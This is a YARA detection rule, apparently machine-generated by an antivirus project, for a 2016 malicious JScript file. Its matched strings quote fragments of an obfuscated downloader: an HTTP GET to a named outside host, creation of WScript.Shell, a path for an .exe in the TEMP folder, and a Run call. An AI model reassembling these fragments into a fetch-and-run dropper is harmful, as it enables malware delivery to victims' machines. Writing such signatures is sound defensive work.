rule sig_20160330_75c425220c0b2c1cd978f8e2647d355c {
  meta:
    description = "datamaliciousorder - file 20160330_75c425220c0b2c1cd978f8e2647d355c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9a6ecba97323d6b6ebd6b75671c08f893b73798d8f5280a346d5c43389f52a99"

  strings:
    $s1  = "_R[_TI](\"GET\", \"http://hollandfoodexchange.com/d7jsa\", false);" fullword ascii
    $s2  = "var _E0 = function _KS() {return WScript[_E](\"WScript\"+\".Shell\");}(), _RY = 11;" fullword ascii
    $s3  = "function _AT(_H0, _AS){_X = _X * 1; return _H0 - _AS;};" fullword ascii
    $s4  = "if (_R[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _S() {return _E0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"DQbFryeg3eI.ex\" + \"e\";};" fullword ascii
    $s6  = "function _TX(){return _N0 + \"\";};" fullword ascii
    $s7  = "function _ZD() {return ((_L == true) && (_L == _Y)) ? 1 : _X;};" fullword ascii
    $s8  = "function _M(_WM){_E0[\"Run\"](_WM, _X, _X);};" fullword ascii
    $s9  = "function _K()" fullword ascii
    $s10 = "return _AT(_TT, _RF);" fullword ascii
    $s11 = "function _Q0(){return 22;};" fullword ascii
    $s12 = "function _AX(){return _E;};" fullword ascii
    $s13 = "var _JD = new this[\"Date\"]();" fullword ascii
    $s14 = "function _Q(_N) {var _M0 = (1, 2, 3, 4, 5, _N); return _M0;};" fullword ascii
    $s15 = " while (_MV){" fullword ascii
    $s16 = "var _L = false;" fullword ascii
    $s17 = "_L = true; " fullword ascii
    $s18 = "var _Y = false;" fullword ascii
    $s19 = "var _V = false;" fullword ascii
    $s20 = "_Y = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}